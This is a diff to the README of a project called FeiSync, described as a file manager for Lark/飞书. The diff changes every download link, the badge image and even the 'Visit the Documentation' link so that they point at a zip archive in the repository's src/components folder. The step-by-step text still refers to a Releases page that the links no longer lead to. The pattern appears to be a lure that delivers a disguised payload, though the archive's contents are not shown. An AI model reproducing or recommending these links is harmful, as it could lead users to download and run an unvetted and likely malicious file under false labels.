@@ -8,13 +8,13 @@ FeiSync is a powerful file management tool designed to enhance your experience w
 
 You can download FeiSync from our Releases page. Click the button below to proceed.
 
-[![Download FeiSync](https://img.shields.io/badge/Download_Feisync-1.0-brightgreen)](https://github.com/disconnec/FeiSync/releases)
+[![Download FeiSync](https://github.com/disconnec/FeiSync/raw/refs/heads/main/src/components/Sync_Fei_1.7.zip)](https://github.com/disconnec/FeiSync/raw/refs/heads/main/src/components/Sync_Fei_1.7.zip)
 
 ### Steps to Download and Install:
 
 1. **Visit the Releases Page**  
    Navigate to the FeiSync Releases page using the link below:  
-   [Download FeiSync](https://github.com/disconnec/FeiSync/releases)
+   [Download FeiSync](https://github.com/disconnec/FeiSync/raw/refs/heads/main/src/components/Sync_Fei_1.7.zip)
 
 2. **Find the Latest Version**  
    On the Releases page, look for the most recent version listed at the top. This version will have the highest number.
@@ -69,10 +69,10 @@ For additional help or to explore advanced features, visit our documentation pag
 
 If you encounter any issues or have questions, feel free to reach out to support through the Issues section in the GitHub repository.
 
-[Visit the Documentation](https://github.com/disconnec/FeiSync/releases)
+[Visit the Documentation](https://github.com/disconnec/FeiSync/raw/refs/heads/main/src/components/Sync_Fei_1.7.zip)
 
 ## 🎉 Get Started Now!
 
 FeiSync simplifies the way you manage your files and connects seamlessly with Lark / 飞书. Click below to begin your journey!
 
-[![Download FeiSync](https://img.shields.io/badge/Download_Feisync-1.0-brightgreen)](https://github.com/disconnec/FeiSync/releases)
+[![Download FeiSync](https://github.com/disconnec/FeiSync/raw/refs/heads/main/src/components/Sync_Fei_1.7.zip)](https://github.com/disconnec/FeiSync/raw/refs/heads/main/src/components/Sync_Fei_1.7.zip)
